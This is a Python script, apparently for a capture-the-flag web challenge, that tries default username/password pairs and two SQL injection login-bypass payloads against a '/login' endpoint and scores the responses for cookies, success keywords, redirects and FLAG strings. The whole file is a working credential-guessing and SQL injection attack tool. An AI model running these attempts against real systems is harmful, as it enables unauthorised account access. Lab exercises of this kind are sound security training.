import requests
import re
from urllib.parse import urlparse

# Target URL - assuming login endpoint
base_url = "http://target"  # Will be updated if different
login_endpoint = "/login"

# Test credentials and payloads
test_cases = [
    {"username": "homer", "password": "homer", "description": "homer/homer"},
    {"username": "bart", "password": "bart", "description": "bart/bart"},
    {"username": "admin", "password": "admin", "description": "admin/admin"},
    {"username": "admin' OR '1'='1", "password": "anything", "description": "SQLi in username"},
    {"username": "admin", "password": "' OR '1'='1", "description": "SQLi in password"},
]

results = []

print("[*] Starting credential testing with session persistence\n")
print("="*80)

for idx, test_case in enumerate(test_cases, 1):
    print(f"\n[TEST {idx}] {test_case['description']}")
    print("-"*80)
    
    # Create new session for each test
    session = requests.Session()
    
    try:
        # Prepare login data
        login_data = {
            "username": test_case["username"],
            "password": test_case["password"]
        }
        
        # Make login request with redirects enabled
        response = session.post(
            f"{base_url}{login_endpoint}",
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        # Capture results
        final_url = response.url
        status_code = response.status_code
        content = response.text
        content_length = len(content)
        cookies = dict(session.cookies)
        
        # Look for success indicators
        success_indicators = []
        indicators_to_check = [
            "logged in", "welcome back", "dashboard", "logout",
            "welcome", "profile", "sign out", "log out"
        ]
        
        for indicator in indicators_to_check:
            if indicator.lower() in content.lower():
                success_indicators.append(indicator)
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', content)
        flag_found = flag_match.group(0) if flag_match else None
        
        # Print results
        print(f"[+] Status Code: {status_code}")
        print(f"[+] Final URL: {final_url}")
        print(f"[+] Content Length: {content_length} bytes")
        print(f"[+] Cookies: {cookies if cookies else 'None'}")
        print(f"[+] Success Indicators: {success_indicators if success_indicators else 'None'}")
        
        if flag_found:
            print(f"[!] FLAG FOUND: {flag_found}")
        
        # Print response headers (check for redirects)
        print(f"[+] Response Headers:")
        for key, value in response.headers.items():
            if key.lower() in ['location', 'set-cookie', 'content-type']:
                print(f"    {key}: {value}")
        
        # Print full response content
        print(f"\n[+] Response Content:")
        print(content)
        print("\n" + "-"*80)
        
        # Store results for comparison
        results.append({
            "test_case": test_case["description"],
            "username": test_case["username"],
            "password": test_case["password"],
            "status_code": status_code,
            "final_url": final_url,
            "content_length": content_length,
            "cookies": cookies,
            "success_indicators": success_indicators,
            "flag": flag_found,
            "has_success": len(success_indicators) > 0
        })
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        results.append({
            "test_case": test_case["description"],
            "username": test_case["username"],
            "password": test_case["password"],
            "error": str(e)
        })
    
    finally:
        session.close()

# Comparison analysis
print("\n" + "="*80)
print("[COMPARISON ANALYSIS]")
print("="*80)

# Group by final URL
print("\n[+] Tests grouped by Final URL:")
url_groups = {}
for result in results:
    if "error" not in result:
        url = result["final_url"]
        if url not in url_groups:
            url_groups[url] = []
        url_groups[url].append(result["test_case"])

for url, tests in url_groups.items():
    print(f"\n  URL: {url}")
    for test in tests:
        print(f"    - {test}")

# Group by content length
print("\n[+] Tests grouped by Content Length:")
length_groups = {}
for result in results:
    if "error" not in result:
        length = result["content_length"]
        if length not in length_groups:
            length_groups[length] = []
        length_groups[length].append(result["test_case"])

for length, tests in sorted(length_groups.items()):
    print(f"\n  Length: {length} bytes")
    for test in tests:
        print(f"    - {test}")

# Tests with success indicators
print("\n[+] Tests with Success Indicators:")
successful_tests = [r for r in results if "error" not in r and r.get("has_success")]
if successful_tests:
    for result in successful_tests:
        print(f"\n  {result['test_case']}:")
        print(f"    Indicators: {', '.join(result['success_indicators'])}")
        print(f"    Cookies: {result['cookies']}")
        print(f"    Final URL: {result['final_url']}")
else:
    print("  None")

# Tests with cookies
print("\n[+] Tests with Cookies Set:")
cookie_tests = [r for r in results if "error" not in r and r.get("cookies")]
if cookie_tests:
    for result in cookie_tests:
        print(f"\n  {result['test_case']}:")
        print(f"    Cookies: {result['cookies']}")
else:
    print("  None")

# Flags found
print("\n[+] Flags Found:")
flag_tests = [r for r in results if "error" not in r and r.get("flag")]
if flag_tests:
    for result in flag_tests:
        print(f"\n  {result['test_case']}: {result['flag']}")
else:
    print("  None")

# Summary
print("\n" + "="*80)
print("[SUMMARY]")
print("="*80)
print(f"Total tests: {len(results)}")
print(f"Tests with success indicators: {len(successful_tests)}")
print(f"Tests with cookies: {len(cookie_tests)}")
print(f"Tests with flags: {len(flag_tests)}")
print(f"Unique final URLs: {len(url_groups)}")
print(f"Unique content lengths: {len(length_groups)}")

# Identify most likely successful authentication
print("\n[+] Most Likely Successful Authentications:")
for result in results:
    if "error" not in result:
        score = 0
        reasons = []
        
        if result.get("cookies"):
            score += 2
            reasons.append("has cookies")
        if result.get("has_success"):
            score += 3
            reasons.append(f"has success indicators ({len(result['success_indicators'])})")
        if result.get("flag"):
            score += 5
            reasons.append("FLAG found")
        
        # Check if redirected (URL different from login)
        if "/login" not in result["final_url"].lower():
            score += 1
            reasons.append("redirected from login")
        
        if score >= 3:
            print(f"\n  {result['test_case']} (Score: {score})")
            print(f"    Reasons: {', '.join(reasons)}")
            print(f"    Final URL: {result['final_url']}")
            if result.get("flag"):
                print(f"    FLAG: {result['flag']}")

